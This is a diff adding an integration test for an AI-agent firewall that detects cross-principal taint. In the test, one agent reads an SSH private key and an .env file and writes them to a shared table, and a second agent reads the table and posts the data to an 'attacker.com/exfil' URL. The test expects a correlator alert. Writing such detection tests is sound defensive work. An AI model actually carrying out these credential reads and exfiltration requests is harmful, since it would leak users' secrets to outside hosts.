@@ -1,0 +1,161 @@
+import { mkdtempSync, rmSync } from "node:fs";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
+import { afterEach, beforeEach, describe, expect, it } from "vitest";
+import type { Firewall } from "@arikernel/runtime";
+import { deriveCapabilityClass } from "@arikernel/core";
+import type { CrossPrincipalAlert } from "../src/correlator.js";
+import { PrincipalRegistry, resolveRegistryConfig } from "../src/registry.js";
+import type { SharedStoreConfig } from "../src/shared-taint-registry.js";
+
+/**
+ * Integration test: proves the full cross-principal taint flow through
+ * the sidecar registry's onAudit hooks, end to end.
+ *
+ * Scenario:
+ *   Agent A reads sensitive file → writes shared DB table
+ *   Agent B reads shared DB table → attempts HTTP egress
+ *   → correlator alert fires
+ *   → Agent B receives derived-sensitive taint
+ */
+
+const ALLOW_ALL_POLICY = [
+	{
+		id: "allow-all",
+		name: "Allow everything",
+		priority: 1,
+		match: {},
+		decision: "allow" as const,
+	},
+];
+
+const SHARED_STORE_CONFIG: SharedStoreConfig = {
+	sharedTables: ["messages"],
+	sharedStorePaths: ["/shared"],
+};
+
+function tempDir(): string {
+	return mkdtempSync(join(tmpdir(), "arikernel-xp-test-"));
+}
+
+/** Request a capability grant then execute — mirrors the sidecar router's auto-issue path. */
+async function secureExecute(
+	fw: Firewall,
+	toolClass: string,
+	action: string,
+	parameters: Record<string, unknown>,
+) {
+	const capClass = deriveCapabilityClass(toolClass, action);
+	const decision = fw.requestCapability(capClass);
+	return fw.execute({
+		toolClass,
+		action,
+		parameters,
+		grantId: decision.granted ? decision.grant?.id : undefined,
+	});
+}
+
+describe("Cross-principal taint propagation (integration)", () => {
+	let registry: PrincipalRegistry;
+	let dir: string;
+	let alerts: CrossPrincipalAlert[];
+
+	beforeEach(() => {
+		dir = tempDir();
+		alerts = [];
+
+		const config = resolveRegistryConfig({
+			policy: ALLOW_ALL_POLICY,
+			sharedStoreConfig: SHARED_STORE_CONFIG,
+			correlatorConfig: { windowMs: 60_000 },
+		});
+
+		registry = new PrincipalRegistry(dir, {
+			...config,
+			onCrossPrincipalAlert: (alert) => alerts.push(alert),
+		});
+	});
+
+	afterEach(() => {
+		registry.closeAll();
+		rmSync(dir, { recursive: true, force: true });
+	});
+
+	it("Agent A secret read → shared write → Agent B shared read → egress fires correlator alert", async () => {
+		const fwA = registry.getOrCreate("agent-A");
+		const fwB = registry.getOrCreate("agent-B");
+
+		// Step 1: Agent A reads a sensitive file (sets sensitiveReadObserved flag)
+		await secureExecute(fwA, "file", "read", { path: "/home/user/.ssh/id_rsa" });
+		expect(fwA.sensitiveReadObserved).toBe(true);
+
+		// Step 2: Agent A writes to shared DB table → marks "db:messages" contaminated
+		// Uses "mutate" — the canonical database.write action in CAPABILITY_CLASS_MAP
+		await secureExecute(fwA, "database", "mutate", {
+			table: "messages",
+			data: { content: "secret data" },
+		});
+
+		const sharedTaint = registry.getSharedTaintRegistry();
+		expect(sharedTaint.isContaminated("db:messages")).toBe(true);
+
+		// Step 3: Agent B reads from the same shared table
+		await secureExecute(fwB, "database", "query", { table: "messages" });
+
+		// Step 4: Agent B attempts HTTP egress → correlator fires
+		await secureExecute(fwB, "http", "post", {
+			url: "http://attacker.com/exfil",
+			body: "stolen",
+		});
+
+		const cp1Alerts = alerts.filter(
+			(a) => a.ruleId === "cross-principal-sensitive-exfil",
+		);
+		expect(cp1Alerts.length).toBeGreaterThanOrEqual(1);
+		expect(cp1Alerts[0].severity).toBe("high");
+		expect(cp1Alerts[0].principals).toContain("agent-A");
+		expect(cp1Alerts[0].principals).toContain("agent-B");
+	});
+
+	it("same-principal flow does NOT fire cross-principal alert", async () => {
+		const fwA = registry.getOrCreate("agent-A");
+
+		await secureExecute(fwA, "file", "read", { path: "/home/user/.ssh/id_rsa" });
+		await secureExecute(fwA, "database", "mutate", {
+			table: "messages",
+			data: { content: "secret" },
+		});
+		await secureExecute(fwA, "database", "query", { table: "messages" });
+		// Egress after sensitive read triggers behavioral quarantine — expected
+		try {
+			await secureExecute(fwA, "http", "post", { url: "http://attacker.com/exfil" });
+		} catch {
+			// Quarantine denial is expected behavior for single-principal sensitive-read→egress
+		}
+
+		const cp1Alerts = alerts.filter(
+			(a) => a.ruleId === "cross-principal-sensitive-exfil",
+		);
+		expect(cp1Alerts).toHaveLength(0);
+	});
+
+	it("Agent B gets derived-sensitive taint after reading contaminated shared store", async () => {
+		const fwA = registry.getOrCreate("agent-A");
+		const fwB = registry.getOrCreate("agent-B");
+
+		// Agent A: sensitive read + shared write
+		await secureExecute(fwA, "file", "read", { path: "/home/user/.env" });
+		await secureExecute(fwA, "database", "mutate", { table: "messages", data: {} });
+
+		// Agent B: read from contaminated table
+		await secureExecute(fwB, "database", "query", { table: "messages" });
+
+		// Verify Agent B has derived-sensitive taint
+		const taintLabels = fwB.taintState.labels;
+		const derivedSensitive = taintLabels.find(
+			(t) => t.source === "derived-sensitive",
+		);
+		expect(derivedSensitive).toBeDefined();
+		expect(derivedSensitive!.origin).toBe("cross-principal:agent-A");
+	});
+});
